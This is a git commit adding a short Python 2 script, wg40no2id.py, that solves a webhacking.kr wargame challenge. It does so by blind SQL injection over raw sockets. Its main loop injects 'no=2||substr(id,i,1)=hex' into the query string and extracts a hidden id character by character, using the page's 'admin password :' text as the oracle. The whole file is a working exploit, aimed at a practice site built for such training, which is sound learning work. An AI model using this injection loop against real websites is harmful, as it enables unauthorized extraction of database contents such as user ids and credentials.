8f39d891cd96103de2649e65b45d3483e5710019
KeLibrary <wpx@daum.net>
2016-12-29 21:04:40 +0900

    Create wg40no2id.py

---
+++ wg40no2id.py
@@ -0,0 +1,36 @@
+import socket
+import re
+
+id=""
+my_cookie="cookie value"
+
+host="Host: webhacking.kr\n"
+cookie="Cookie: PHPSESSID=%s\n\n" % my_cookie
+
+web = 'webhacking.kr'
+ip = socket.gethostbyname(web)
+
+socket.setdefaulttimeout(5)
+
+for i in range(1,30): 
+    s = socket.socket()
+    s.connect((ip, 80))
+    for j in range(36,127):
+        head1="GET /challenge/web/web-29/index.php?no=2%7C%7Csubstr(id,"
+        head2=str(i)
+        head3=",1)="
+        head4=hex(j)
+        head5="&id=guest&pw=guest HTTP/1.1\n"
+        s.send(head1+head2+head3+head4+head5+host+cookie)
+        aa=s.recv(1024)
+        print("i: %d, j: %d (%s)") % (i, j, chr(j))
+        find = re.findall("admin password :",aa)
+
+        if find:
+            id+=chr(j)
+            print "find id: " + id
+            break
+        if j == 126:
+            s.close()
+            print "id is %s" %(id)
+            exit()
